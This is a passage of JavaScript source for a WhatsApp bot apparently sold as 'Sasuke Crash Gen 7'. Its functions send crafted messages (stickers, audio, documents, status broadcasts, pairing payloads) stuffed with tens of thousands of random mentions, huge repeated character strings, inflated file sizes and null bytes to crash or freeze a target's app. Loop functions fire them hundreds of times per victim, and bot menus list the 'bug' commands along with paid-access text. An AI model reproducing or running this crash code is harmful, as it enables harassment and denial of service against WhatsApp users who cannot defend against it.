            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await langgxyz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
async function DelayStc(langgxyz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await langgxyz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}


// Send Pairing
async function SendPairing(isTarget, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await langgxyz.relayMessage(isTarget, messageContent, Ptcp ? {
      participant: {
        jid: isTarget
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}


async function SockMentionJid3(target, Ptcp = false) {
      await langgxyz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    
 async function BaccaratUi(langgxyz, target) {
  await langgxyz.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}

async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await langgxyz.relayMessage(target, message, { participant: { jid: target } });
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Erlangga Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

// End
const tolbug = 999; 
const tolbug2 = 888;
async function SasukeDelayNew(target) {
    for (let i = 0; i < tolbug; i++) {      
       await carouselNew(target)
       await bulldozer(target)
       await carouselNew(target)
       await bulldozer(target)
       await DelayStc(langgxyz, target)
       await DelayStc(langgxyz, target)
       await carouselNew(target)
       await bulldozer(target)
       await carouselNew(target)
       await bulldozer(target)
       await DelayStc(langgxyz, target)
       await DelayStc(langgxyz, target)       
       await SockMentionJid3(target, false)
       await SockMentionJid3(target, false)
       await SockMentionJid3(target, false)
       await BaccaratUi(langgxyz, target)
       await BaccaratUi(langgxyz, target)
       await BaccaratUi(langgxyz, target)
       await CosmoBlankX(target) 
       await CosmoBlankX(target) 
       await CosmoBlankX(target) 
       await CosmoBlankX(target) 
    }
} 

async function SasukeDelay(target) {
    for (let i = 0; i < tolbug; i++) {
       await protocolbug2(target, true)
       await protocolbug1(target, true) 
       await protocolbug2(target, true)
       await protocolbug3(target, true)
       await protocolbug4(target, true)
       await VampPaymentCrash(target, true)
       await protocolbug5v2(target, true)
       await protocolbug5v2(target, true)
       await protocolbug5v2(target, false)
       await protocolbug5v2(target, false)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
       await VampDelayMess(langgxyz, target)
       await VampPrivateBlank(langgxyz, target)
       await VampDelayCrash(langgxyz, target)
       await VampBroadcast(langgxyz, target, true)
       await mentionSw(target)
       await carouselNew(target)
    }
} 

async function SasukeBuldozer(target) {
    for (let i = 0; i < tolbug; i++) {
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
    }
} 

// Combo Dengan True Dan False
async function SasukeDelayInvis(target) {
    for (let i = 0; i < tolbug2; i++) {
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, true)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
       await protocolbug5(target, false)
    }
} 
// Combo BuldozerXProtoaudii
async function SasukeComboSetan(target) {
    for (let i = 0; i < tolbug2; i++) {
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await bulldozer(target)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
    }
} 
// End Funx Bug
        const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./assest/allmedia/erlangga2.jpg") }, { upload: langgxyz.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7 Berikut All Menu Sasuke Crash`
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Slide Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}


\`List Menu Bug group\`
お delaygroup
お blankgroup
お clickfc
お grupsampah
お invisgroup

\`List Menu Group\`
お antilink
お promote
お demote
お kick
お hidetag
お tagall
お open
お close
お totag
お jadian
お tolak
お terima
お putus
お cekpacar

\`List Menu Fun\`
お sticker
お play
お tiktok
お brat
お qc
お bratvid
お bokep
お tourl
お motivasi
お hd
お pin
お play
お cekkhodam
お apakah
お bisakah
お bagaimanakah
お jadian
お tolak
お terima
お putus
お cekpacar
お ai
お qc2
お reactch
お cekidch`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029VbAW10kEVccSqhTBSQ12\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Slide Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}

\`List Menu Owner\`
お addowner
お buttonon
お buttonoff
お delowner
お addmurbug
お delmurbug
お debug
お self
お public
お hidetag
お addcase
お getcase
お ovopay
お danapay
お qrispay
お gopaypay
お clearsession
お buatgc
お $
お >`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029VbAW10kEVccSqhTBSQ12\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Slide Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}

お xdelayui
お buldozer
お protocol5
お protocolbug6
お delaystuck
お delayiosmaker
お spampairing
お clearbug
お clearbug-group

\`List Menu Bug In Place\`
お haisalamkenenal
お ohayopoco
お onichan
お ripperngentod
お erlanggaOfficial
お sasukecrash
お sasukeinplace

\`List Menu Bug group\`
お delaygroup`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029VbAW10kEVccSqhTBSQ12\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qmime})
await langgxyz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


// Auto Vn
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
await langgxyz.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

        switch (command) {
        
case 'slidebutton':{
await slideButton(m.chat)
}
                break
case "bugmenu": {
langgxyz.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });

let mbut = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7*

 ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}

\`List Menu Bug Pilihan\`
お ultimate-sasuke 62xxx

お xdelayui
お buldozer
お protocol5
お protocolbug6
お delaystuck
お delayiosmaker
お spampairing
お clearbug
お clearbug-group

\`List Menu Bug In Place\`
お haisalamkenenal
お ohayopoco
お onichan
お ripperngentod
お erlanggaOfficial
お sasukecrash
お sasukeinplace

\`List Menu Bug group\`
お delaygroup
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: mbut,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 7`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
           "thumbnail": fs.readFileSync('./assest/allmedia/erlangga2.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".info", 
    buttonText: { 
      displayText: 'info' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
  },
     {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "Menu Owner"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: PayX })
}
                break
case "info":{
ErlanggaReply(`Script Ini Di Lengkapi Berbagai Fitur 3 Menu, Jika Anda Memakai Wa Business Pakailah Comannd: .menuv2\n Jika Anda Mau Memakai Menu Slide Button, Silahkan Ketik: .slidebutton`)
 }
                break
case "menu":{

langgxyz.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });
let mbut = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7 Berikut Menu Sasuke Crash*

お \`[Developer]\` : Erlangga Official🐉〽️
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\` : Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}
`

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Sellect Type Menu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Message",
                    sections: [
                        {
                            title: "𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂 𝗗𝗶 𝗕𝗮𝘄𝗮𝗵",
                            highlight_label: "Rekomendasi",
                            rows: [
                                { title: "Bugmenu", description: "Bug Menu Sasuke", id: `.bugmenu` }
                             ]
                               }, 
                            {
                            title: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼𝗼👥",
                            highlight_label: "Powered By Erlangga Official",
                            rows: [
                                { title: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼", description: " Menampilkan Thanks To", id: `tqto` },
                                   { title: "Ownermenu", description: "Menampilkan Owner Menu", id: `.ownermenu` },
                                { title: "Fun Menu", description: "Menampilkan Fun Menu", id: `.funmenu` },
                                { title: "Group Menu", description: "Menampilkan Fun Menu", id: `.grupmenu` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    let buttonMessage = {
       image: poto, 
        caption: mbut,
        contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: `Sasuke Crash`,
        body: `Gen 7🐉〽️`,
        previewType: "VIDEO",
        thumbnail: marga,
        sourceUrl: `https://github.com/erlangga050809`,
        mediaUrl: `https://wa.me/6288905301692`
        }
       },
        footer: "© Erlangga Official 🐉〽️",
        buttons: flowActions,
        viewOnce: true,
        headerType: 1
 };

await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: qmime });
}
break
case "funmenu": {
let anjg = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7*

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}


\`List Menu Fun\`
お sticker
お play
お tiktok
お brat
お qc
お bratvid
お bokep
お tourl
お motivasi
お hd
お pin
お play
お jadian
お tolak
お terima
お putus
お cekpacar
お ai
お cekidch
お qc2
お reactch
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: anjg,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 7`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
           "thumbnail": fs.readFileSync('./assest/allmedia/erlangga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".info", 
    buttonText: { 
      displayText: 'info' 
    }
  }, {
    buttonId: ".script", 
    buttonText: {
      displayText: "Buy Script"
    }
   },
   {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
case 'grupmenu':{
let puqimak = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7*

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
